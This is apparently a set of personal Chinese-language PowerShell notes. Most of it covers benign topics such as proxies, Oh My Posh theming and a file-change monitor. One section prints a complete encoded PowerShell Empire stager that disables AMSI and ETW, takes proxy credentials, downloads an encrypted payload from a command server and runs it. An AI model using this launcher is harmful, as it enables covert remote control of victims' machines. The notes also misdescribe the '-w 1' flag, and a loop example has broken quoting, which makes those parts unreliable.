# Powershell

- [Powershell](#powershell)
  - [版本信息](#版本信息)
    - [Powershell 7](#powershell-7)
  - [网络](#网络)
    - [代理](#代理)
    - [域名解析](#域名解析)
  - [主题](#主题)
    - [Oh My Posh](#oh-my-posh)
        - [Quick Start For Windows](#quick-start-for-windows)
    - [显示时间](#显示时间)
  - [基础语法](#基础语法)
    - [杂项](#杂项)
    - [循环结构](#循环结构)
  - [文件操作](#文件操作)
    - [清除文件中的空行](#清除文件中的空行)
  - [目标目录文件变动监控备份](#目标目录文件变动监控备份)
  - [powershell empire 上线命令](#powershell-empire-上线命令)
  - [远程连接](#远程连接)
  - [制作提示窗口](#制作提示窗口)
  - [输出信息](#输出信息)
  - [模块](#模块)
    - [安装模块](#安装模块)
  - [证书](#证书)
  - [启用或关闭 Windows 功能](#启用或关闭-windows-功能)
  - [报错收集](#报错收集)
    - [无法加载 `xxx.ps1`, 因在此系统上禁止运行脚本。有关详细信息，请参阅 关于执行策略 - PowerShell | Microsoft Docs 中的 `about_Execution_Policies`。](#无法加载-xxxps1-因在此系统上禁止运行脚本有关详细信息请参阅-关于执行策略---powershell--microsoft-docs-中的-about_execution_policies)


---

## 版本信息

```powershell
$PSVersionTable
$PSVersionTable.PSVersion
```

![image-20230918174306661](http://cdn.ayusummer233.top/DailyNotes/202309181743508.png)

![image-20230918174411070](http://cdn.ayusummer233.top/DailyNotes/202309181744112.png)

---

### Powershell 7


> [Releases · PowerShell/PowerShell (github.com)](https://github.com/PowerShell/PowerShell/releases)
>
> [在 Windows 上安装 PowerShell - PowerShell | Microsoft Docs](https://docs.microsoft.com/zh-cn/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.2#msi)
>
> [从 Windows PowerShell 5.1 迁移到 PowerShell 7 - PowerShell | Microsoft Docs](https://docs.microsoft.com/zh-cn/powershell/scripting/whats-new/migrating-from-windows-powershell-51-to-powershell-7?view=powershell-7.2)

```powershell
# 查看 powershell 版本
$psversiontable
```

PowerShell 7 是专为云、本地和混合环境设计的，它包含增强功能和[新功能](https://docs.microsoft.com/zh-cn/powershell/scripting/whats-new/what-s-new-in-powershell-70?view=powershell-7.2)。

- 与 Windows PowerShell 并行安装和运行
- 提升了与现有 Windows PowerShell 模块的兼容性
- 新语言功能(如三元运算符和 `ForEach-Object -Parallel`) 
- 提高了性能
- 基于 SSH 的远程处理
- 跨平台互操作性
- 支持 Docker 容器

PowerShell 7 与 Windows PowerShell 并行运行，可便于你在部署前轻松地测试和比较各个版本。 迁移简单、快捷、安全，

以下 Windows 操作系统支持 PowerShell 7：

- Windows 8.1、10 和 11
- Windows Server 2012、2012 R2、2016 和 2019

PowerShell 7 还在 macOS 和多个 Linux 发行版本上运行。 若要获取受支持操作系统的列表，并了解支持生命周期，请参阅 [PowerShell 支持生命周期](https://docs.microsoft.com/zh-cn/powershell/scripting/install/powershell-support-lifecycle?view=powershell-7.2)。

---

PowerShell 7 默认安装路径为 `C:\Program Files\PowerShell\`

---

## 网络

### 代理

```powershell
# 为当前 powershell 会话设置 http 与 https 代理
$env:HTTP_PROXY="http://127.0.0.1:7890"
$env:HTTPS_PROXY="http://127.0.0.1:7890"
```

----

### 域名解析

```powershell
Resolve-DnsName www.bing.com
```

![image-20231023151249741](http://cdn.ayusummer233.top/DailyNotes/202310231512020.png)

---

## 主题

---

### Oh My Posh


> [Home | Oh My Posh](https://ohmyposh.dev/)

A prompt theme engine for any shell.

![image-20230414001558700](http://cdn.ayusummer233.top/DailyNotes/202304140016105.png)

##### Quick Start For Windows

- 首先 [在 Windows 上安装 PowerShell7 - PowerShell | Microsoft Learn](https://learn.microsoft.com/zh-cn/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.2#msi), 默认的 Powershell5 不支持主题中的一些语法

- 使用 `winget` 安装 `OhMyPosh`:

  由于要到 github 获取资源, 因此挂代理会快些, 以本地 7890 端口有代理为例, 可以在 powershell 中临时设置代理配置:

  ```powershell
  $env:HTTP_PROXY="http://127.0.0.1:7890"
  $env:HTTPS_PROXY="http://127.0.0.1:7890"
  ```

  然后使用 `winget` 安装 `OhMyPosh`

  ```powershell
  winget install JanDeDobbeleer.OhMyPosh -s winget
  ```

- 安装一个支持的字体, 如 [MesloLGSNF](https://github.com/fontmgr/MesloLGSNF)

  > 官方文档中使用 `oh-my-posh font install` 选择字体进行安装, 不过我安装后进行配置时总是找不到字体, 最终使用 `MESLOLGS NF` 成功进行了配置

  然后在 Powershell 中使用快捷键 `Ctrl+Shift+,` 调起配置文件, 在 `profiles` 中的 `defaults` 属性下添加 `font.face` 属性

  ![image-20230414002805811](http://cdn.ayusummer233.top/DailyNotes/202304140028837.png)

  ```json
              "font":
              {
                  "face": "MesloLGS NF"
              }
  ```

  添加并保存后会自动弹回到打开的 Powershell 窗口, 不报错就说明成功用上了字体

  ***

  对于 VSCode 而言, VSCode 调起的终端中的字体配置还需要在 VSCode 的配置项中配下

  ![image-20230414003342061](http://cdn.ayusummer233.top/DailyNotes/202304140033087.png)

- 接下来编辑 powershell 配置文件配置默认使用 `OhMyPosh`

  ```powershell
  code $PROFILE
  ```

  在配置中加上如下语句

  ```powershell
  oh-my-posh init pwsh | Invoke-Expression
  ```

  ![image-20230414003110073](http://cdn.ayusummer233.top/DailyNotes/202304140031095.png)

  这样即可成功让 powershell 使用上 OhMyPosh

- 配置主题

  可以在 [Themes | Oh My Posh](https://ohmyposh.dev/docs/themes) 查看 OhMyPosh 中支持的主题

  或者使用如下命令直接在 Powershell 中预览主题

  ```powershell
  Get-PoshThemes
  ```

  ![image-20230414003535662](http://cdn.ayusummer233.top/DailyNotes/202304140035712.png)

  > 记得及时 `Ctrl + C`, 不然会拖很长, 毕竟主题挺多的

  在 Powershell 中预览主题时, 主题的名字是超链接, 可以通过 Ctrl + 鼠标点击的形式编辑该主题配置文件

  ![image-20230414003739707](http://cdn.ayusummer233.top/DailyNotes/202304140037760.png)

  ![image-20230414003752894](http://cdn.ayusummer233.top/DailyNotes/202304140037931.png)

  然后编辑 Powershell 配置文件, 配置 OhMyPosh 的主题

  ```powershell
  code $PROFILE
  ```

  添加如下命令

  ```powershell
  oh-my-posh init pwsh --config '主题json路径' | Invoke-Expression
  ```

  ![image-20230414004039339](http://cdn.ayusummer233.top/DailyNotes/202304140040357.png)

  然后重启 Powershell/VSCode 窗口即可看到 Powershell 加载了 OhMyPosh 及设定的主题

  ![image-20230414004140231](http://cdn.ayusummer233.top/DailyNotes/202304140041246.png)

  ![image-20230414004152193](http://cdn.ayusummer233.top/DailyNotes/202304140041208.png)

  > 需要注意的是如果是默认的 powershell5 的话, 加载主题可能会报错, 且每次打开 powershell 窗口均会报错, 因此建议直接升级到 powershell7
  >
  > ![image-20230414004218421](http://cdn.ayusummer233.top/DailyNotes/202304140042453.png)
  >
  > 可以通过如下命令查看 powershell 版本
  >
  > ```powershell
  > $psversiontable
  > ```
  >
  > ![image-20230414004313579](http://cdn.ayusummer233.top/DailyNotes/202304140043602.png)
  >
  > ![image-20230414004329598](http://cdn.ayusummer233.top/DailyNotes/202304140043653.png)

---

### 显示时间

```powershell
function prompt {
    # 显示当前时间
    $currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "Time: $currentTime" -NoNewline -ForegroundColor Green

    # PowerShell默认提示符
    " PS $($executionContext.SessionState.Path.CurrentLocation)$('>' * ($nestedPromptLevel + 1)) "
}
```

PowerShell的提示函数(`prompt` 函数) 用于生成命令提示符。通过在此函数中添加显示当前时间的代码，可以在每个提示符前显示时间。

把上述 PowerShell 代码加到 profile 里(例如 `code $profile` 然后在打开的 VSCode 中的 profile 文件中输入上述代码并保存) 然后重启 PowerShell 就可以显示每次命令时间了, 效果如下:

![image-20231127185352895](http://cdn.ayusummer233.top/DailyNotes/202311271853066.png)

> [CMD 中也有类似的方法显示当前时间](../CMD/index.md#显示时间)

----

## 基础语法

---

### 杂项

- 在 powershell 中, 转义符号为 反引号(`` ` ``) 而非反斜杠(``\``), 例如:
  - `换行`: `` `n ``
  - `回车`: `` `r ``
  - `空格`: `` `s ``
  - `制表符`: `` `t ``
  - `反引号`: `` `` ``

---

### 循环结构

```powershell
# 循环执行 curl http://192.168.1.21/phpinfo.php -UseBasicParsing
$cmd_always = 'curl http://192.168.1.21/phpinfo.php -UseBasicParsing
while ($true) {
    Invoke-Expression $cmd_always
}
```



---

## 文件操作

### 清除文件中的空行

```powershell
(Get-Content -Path $FilePath | Where-Object { $_.Trim() -ne "" }) | Set-Content -Path $FilePath
```

- `Get-Content` 用于读取文件内容。

- `Where-Object { $_.Trim() -ne "" }` 是一个过滤器，它会排除所有的空行和只包含空格或制表符的行。

  - `$_` 表示当前处理的行
  - `Trim()` 函数会移除字符串两端的空格和制表符

  如果处理后的行为空字符串(`""`) ，则该行会被排除。

- `Set-Content`  用于将处理后的内容写回到原文件。

---

## 目标目录文件变动监控备份

```powershell
# 监控的目录
$targetDir = "E:\temp\testDir"
# log文件路径为当前目录下的log.txt
$logFile = ".\log.txt"
# 在当前目录下新建一个 monitor_cache 目录用于存放监控的文件
$cacheDir = ".\monitor_cache"
if (!(Test-Path $cacheDir)) {
    New-Item -ItemType Directory -Force -Path $cacheDir
}
Write-Host $cacheDir "created for cache files"

# 创建监控对象
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $targetDir
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

# 定义一个通用的事件处理函数，根据不同的事件类型执行不同的操作
$commonAction = {
    # 获取事件参数
    $path = $Event.SourceEventArgs.FullPath
    $changeType = $Event.SourceEventArgs.ChangeType
    # 记录下时间以及变动的文件信息
    $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    # 日志信息
    $log = "$date File $path was $changeType"
    # 输出到控制台
    Write-Host $log
    # 将变动的文件信息写入log文件
    Add-Content $logFile $log

    # 如果变动的是个文件而非目录，且不是删除事件，则将其复制到 monitor_cache 目录下，并前缀当前时间以及事件类型
    if (!(Test-Path $path -PathType Container) -and ($changeType -ne "Deleted")) {
        # 生成新的文件路径，替换掉冒号、空格和反斜杠等特殊字符，避免路径错误或冲突
        $newPath = $cacheDir + "\" + ($date + "_" + $changeType + "_" + $path.Replace($targetDir, "")).Replace(":", "-").Replace(" ", "_").Replace("\", "_")
        Copy-Item $path $newPath
    }
}

# 注册事件，使用同一个事件处理函数，并传递不同的事件类型参数
$eventTypes = @("Created", "Changed", "Deleted", "Renamed")
foreach ($eventType in $eventTypes) {
    Register-ObjectEvent $watcher $eventType -Action $commonAction
}

# 等待事件发生
try {
    while ($true) {
        Start-Sleep 1
    }
}
finally {
    # 清理事件注册
    $watcher.Dispose()
}

```

![image-20230723233243063](http://cdn.ayusummer233.top/DailyNotes/202307232332958.png)

---

## powershell empire 上线命令

```bash
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABZAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAEgAdQB2ACwAMwBnAHQAcwBjAH0AIwBfAEUAOgBmAEYAWAB3AG4AMgBiAFUAUABWAHwAaQBNAGUAMAArADUAUgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYwBIAEcAQQBmAGQATABaAEQAQwBFAHQATABNAEsAPQBsAEwAcQA4AFUAdwBpAEUAdQB6AHYASQBRAEQANABqADcAcAA2AEkASgBzAGgAaQBpADEARQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
```

- `powershell`：表示调用 PowerShell 程序。
- `-noP`：表示不加载配置文件。包括启动时加载的个人配置文件(Profile) 和系统级别的配置文件。使用此参数可以在启动 PowerShell 时跳过配置文件的加载，加快启动速度。
- `-sta`：`Single Threaded Apartment`表示使用单线程的会话模式。
- `-w 1`：等待指定的时间(以秒为单位) 后自动退出 PowerShell。在这里，`-w 1` 表示等待 1 秒后自动退出 PowerShell。
- `-enc`：表示后面跟着的是一个 Base64 编码的字符串，需要解码后执行。

上述 Base64 编码的字符串解码后得到:

```
"I\u0000f\u0000(\u0000$\u0000P\u0000S\u0000V\u0000e\u0000r\u0000s\u0000i\u0000o\u0000n\u0000T\u0000a\u0000b\u0000l\u0000e\u0000.\u0000P\u0000S\u0000V\u0000e\u0000r\u0000s\u0000i\u0000o\u0000n\u0000.\u0000M\u0000a\u0000j\u0000o\u0000r\u0000 \u0000-\u0000g\u0000e\u0000 \u00003\u0000)\u0000{\u0000$\u0000R\u0000e\u0000f\u0000=\u0000[\u0000R\u0000e\u0000f\u0000]\u0000.\u0000A\u0000s\u0000s\u0000e\u0000m\u0000b\u0000l\u0000y\u0000.\u0000G\u0000e\u0000t\u0000T\u0000y\u0000p\u0000e\u0000(\u0000'\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000M\u0000a\u0000n\u0000a\u0000g\u0000e\u0000m\u0000e\u0000n\u0000t\u0000.\u0000A\u0000u\u0000t\u0000o\u0000m\u0000a\u0000t\u0000i\u0000o\u0000n\u0000.\u0000A\u0000m\u0000s\u0000i\u0000U\u0000t\u0000i\u0000l\u0000s\u0000'\u0000)\u0000;\u0000$\u0000R\u0000e\u0000f\u0000.\u0000G\u0000e\u0000t\u0000F\u0000i\u0000e\u0000l\u0000d\u0000(\u0000'\u0000a\u0000m\u0000s\u0000i\u0000I\u0000n\u0000i\u0000t\u0000F\u0000a\u0000i\u0000l\u0000e\u0000d\u0000'\u0000,\u0000'\u0000N\u0000o\u0000n\u0000P\u0000u\u0000b\u0000l\u0000i\u0000c\u0000,\u0000S\u0000t\u0000a\u0000t\u0000i\u0000c\u0000'\u0000)\u0000.\u0000S\u0000e\u0000t\u0000v\u0000a\u0000l\u0000u\u0000e\u0000(\u0000$\u0000N\u0000u\u0000l\u0000l\u0000,\u0000$\u0000t\u0000r\u0000u\u0000e\u0000)\u0000;\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000D\u0000i\u0000a\u0000g\u0000n\u0000o\u0000s\u0000t\u0000i\u0000c\u0000s\u0000.\u0000E\u0000v\u0000e\u0000n\u0000t\u0000i\u0000n\u0000g\u0000.\u0000E\u0000v\u0000e\u0000n\u0000t\u0000P\u0000r\u0000o\u0000v\u0000i\u0000d\u0000e\u0000r\u0000]\u0000.\u0000G\u0000e\u0000t\u0000F\u0000i\u0000e\u0000l\u0000d\u0000(\u0000'\u0000m\u0000_\u0000e\u0000n\u0000a\u0000b\u0000l\u0000e\u0000d\u0000'\u0000,\u0000'\u0000N\u0000o\u0000n\u0000P\u0000u\u0000b\u0000l\u0000i\u0000c\u0000,\u0000I\u0000n\u0000s\u0000t\u0000a\u0000n\u0000c\u0000e\u0000'\u0000)\u0000.\u0000S\u0000e\u0000t\u0000V\u0000a\u0000l\u0000u\u0000e\u0000(\u0000[\u0000R\u0000e\u0000f\u0000]\u0000.\u0000A\u0000s\u0000s\u0000e\u0000m\u0000b\u0000l\u0000y\u0000.\u0000G\u0000e\u0000t\u0000T\u0000y\u0000p\u0000e\u0000(\u0000'\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000M\u0000a\u0000n\u0000a\u0000g\u0000e\u0000m\u0000e\u0000n\u0000t\u0000.\u0000A\u0000u\u0000t\u0000o\u0000m\u0000a\u0000t\u0000i\u0000o\u0000n\u0000.\u0000T\u0000r\u0000a\u0000c\u0000i\u0000n\u0000g\u0000.\u0000P\u0000S\u0000E\u0000t\u0000w\u0000L\u0000o\u0000g\u0000P\u0000r\u0000o\u0000v\u0000i\u0000d\u0000e\u0000r\u0000'\u0000)\u0000.\u0000G\u0000e\u0000t\u0000F\u0000i\u0000e\u0000l\u0000d\u0000(\u0000'\u0000e\u0000t\u0000w\u0000P\u0000r\u0000o\u0000v\u0000i\u0000d\u0000e\u0000r\u0000'\u0000,\u0000'\u0000N\u0000o\u0000n\u0000P\u0000u\u0000b\u0000l\u0000i\u0000c\u0000,\u0000S\u0000t\u0000a\u0000t\u0000i\u0000c\u0000'\u0000)\u0000.\u0000G\u0000e\u0000t\u0000V\u0000a\u0000l\u0000u\u0000e\u0000(\u0000$\u0000n\u0000u\u0000l\u0000l\u0000)\u0000,\u00000\u0000)\u0000;\u0000}\u0000;\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000S\u0000e\u0000r\u0000v\u0000i\u0000c\u0000e\u0000P\u0000o\u0000i\u0000n\u0000t\u0000M\u0000a\u0000n\u0000a\u0000g\u0000e\u0000r\u0000]\u0000:\u0000:\u0000E\u0000x\u0000p\u0000e\u0000c\u0000t\u00001\u00000\u00000\u0000C\u0000o\u0000n\u0000t\u0000i\u0000n\u0000u\u0000e\u0000=\u00000\u0000;\u0000$\u0000w\u0000c\u0000=\u0000N\u0000e\u0000w\u0000-\u0000O\u0000b\u0000j\u0000e\u0000c\u0000t\u0000 \u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000W\u0000e\u0000b\u0000C\u0000l\u0000i\u0000e\u0000n\u0000t\u0000;\u0000$\u0000u\u0000=\u0000'\u0000M\u0000o\u0000z\u0000i\u0000l\u0000l\u0000a\u0000/\u00005\u0000.\u00000\u0000 \u0000(\u0000W\u0000i\u0000n\u0000d\u0000o\u0000w\u0000s\u0000 \u0000N\u0000T\u0000 \u00006\u0000.\u00001\u0000;\u0000 \u0000W\u0000O\u0000W\u00006\u00004\u0000;\u0000 \u0000T\u0000r\u0000i\u0000d\u0000e\u0000n\u0000t\u0000/\u00007\u0000.\u00000\u0000;\u0000 \u0000r\u0000v\u0000:\u00001\u00001\u0000.\u00000\u0000)\u0000 \u0000l\u0000i\u0000k\u0000e\u0000 \u0000G\u0000e\u0000c\u0000k\u0000o\u0000'\u0000;\u0000$\u0000s\u0000e\u0000r\u0000=\u0000$\u0000(\u0000[\u0000T\u0000e\u0000x\u0000t\u0000.\u0000E\u0000n\u0000c\u0000o\u0000d\u0000i\u0000n\u0000g\u0000]\u0000:\u0000:\u0000U\u0000n\u0000i\u0000c\u0000o\u0000d\u0000e\u0000.\u0000G\u0000e\u0000t\u0000S\u0000t\u0000r\u0000i\u0000n\u0000g\u0000(\u0000[\u0000C\u0000o\u0000n\u0000v\u0000e\u0000r\u0000t\u0000]\u0000:\u0000:\u0000F\u0000r\u0000o\u0000m\u0000B\u0000a\u0000s\u0000e\u00006\u00004\u0000S\u0000t\u0000r\u0000i\u0000n\u0000g\u0000(\u0000'\u0000a\u0000A\u0000B\u00000\u0000A\u0000H\u0000Q\u0000A\u0000c\u0000A\u0000A\u00006\u0000A\u0000C\u00008\u0000A\u0000L\u0000w\u0000A\u0000x\u0000A\u0000D\u0000A\u0000A\u0000M\u0000A\u0000A\u0000u\u0000A\u0000D\u0000E\u0000A\u0000L\u0000g\u0000A\u0000x\u0000A\u0000C\u00004\u0000A\u0000M\u0000Q\u0000A\u0000z\u0000A\u0000D\u0000Y\u0000A\u0000O\u0000g\u0000A\u00005\u0000A\u0000D\u0000A\u0000A\u0000O\u0000Q\u0000A\u0000w\u0000A\u0000A\u0000=\u0000=\u0000'\u0000)\u0000)\u0000)\u0000;\u0000$\u0000t\u0000=\u0000'\u0000/\u0000l\u0000o\u0000g\u0000i\u0000n\u0000/\u0000p\u0000r\u0000o\u0000c\u0000e\u0000s\u0000s\u0000.\u0000p\u0000h\u0000p\u0000'\u0000;\u0000$\u0000w\u0000c\u0000.\u0000H\u0000e\u0000a\u0000d\u0000e\u0000r\u0000s\u0000.\u0000A\u0000d\u0000d\u0000(\u0000'\u0000U\u0000s\u0000e\u0000r\u0000-\u0000A\u0000g\u0000e\u0000n\u0000t\u0000'\u0000,\u0000$\u0000u\u0000)\u0000;\u0000$\u0000w\u0000c\u0000.\u0000P\u0000r\u0000o\u0000x\u0000y\u0000=\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000W\u0000e\u0000b\u0000R\u0000e\u0000q\u0000u\u0000e\u0000s\u0000t\u0000]\u0000:\u0000:\u0000D\u0000e\u0000f\u0000a\u0000u\u0000l\u0000t\u0000W\u0000e\u0000b\u0000P\u0000r\u0000o\u0000x\u0000y\u0000;\u0000$\u0000w\u0000c\u0000.\u0000P\u0000r\u0000o\u0000x\u0000y\u0000.\u0000C\u0000r\u0000e\u0000d\u0000e\u0000n\u0000t\u0000i\u0000a\u0000l\u0000s\u0000 \u0000=\u0000 \u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000C\u0000r\u0000e\u0000d\u0000e\u0000n\u0000t\u0000i\u0000a\u0000l\u0000C\u0000a\u0000c\u0000h\u0000e\u0000]\u0000:\u0000:\u0000D\u0000e\u0000f\u0000a\u0000u\u0000l\u0000t\u0000N\u0000e\u0000t\u0000w\u0000o\u0000r\u0000k\u0000C\u0000r\u0000e\u0000d\u0000e\u0000n\u0000t\u0000i\u0000a\u0000l\u0000s\u0000;\u0000$\u0000S\u0000c\u0000r\u0000i\u0000p\u0000t\u0000:\u0000P\u0000r\u0000o\u0000x\u0000y\u0000 \u0000=\u0000 \u0000$\u0000w\u0000c\u0000.\u0000P\u0000r\u0000o\u0000x\u0000y\u0000;\u0000$\u0000K\u0000=\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000T\u0000e\u0000x\u0000t\u0000.\u0000E\u0000n\u0000c\u0000o\u0000d\u0000i\u0000n\u0000g\u0000]\u0000:\u0000:\u0000A\u0000S\u0000C\u0000I\u0000I\u0000.\u0000G\u0000e\u0000t\u0000B\u0000y\u0000t\u0000e\u0000s\u0000(\u0000'\u0000H\u0000u\u0000v\u0000,\u00003\u0000g\u0000t\u0000s\u0000c\u0000}\u0000#\u0000_\u0000E\u0000:\u0000f\u0000F\u0000X\u0000w\u0000n\u00002\u0000b\u0000U\u0000P\u0000V\u0000|\u0000i\u0000M\u0000e\u00000\u0000+\u00005\u0000R\u0000'\u0000)\u0000;\u0000$\u0000R\u0000=\u0000{\u0000$\u0000D\u0000,\u0000$\u0000K\u0000=\u0000$\u0000A\u0000r\u0000g\u0000s\u0000;\u0000$\u0000S\u0000=\u00000\u0000.\u0000.\u00002\u00005\u00005\u0000;\u00000\u0000.\u0000.\u00002\u00005\u00005\u0000|\u0000%\u0000{\u0000$\u0000J\u0000=\u0000(\u0000$\u0000J\u0000+\u0000$\u0000S\u0000[\u0000$\u0000_\u0000]\u0000+\u0000$\u0000K\u0000[\u0000$\u0000_\u0000%\u0000$\u0000K\u0000.\u0000C\u0000o\u0000u\u0000n\u0000t\u0000]\u0000)\u0000%\u00002\u00005\u00006\u0000;\u0000$\u0000S\u0000[\u0000$\u0000_\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000J\u0000]\u0000=\u0000$\u0000S\u0000[\u0000$\u0000J\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000_\u0000]\u0000}\u0000;\u0000$\u0000D\u0000|\u0000%\u0000{\u0000$\u0000I\u0000=\u0000(\u0000$\u0000I\u0000+\u00001\u0000)\u0000%\u00002\u00005\u00006\u0000;\u0000$\u0000H\u0000=\u0000(\u0000$\u0000H\u0000+\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000)\u0000%\u00002\u00005\u00006\u0000;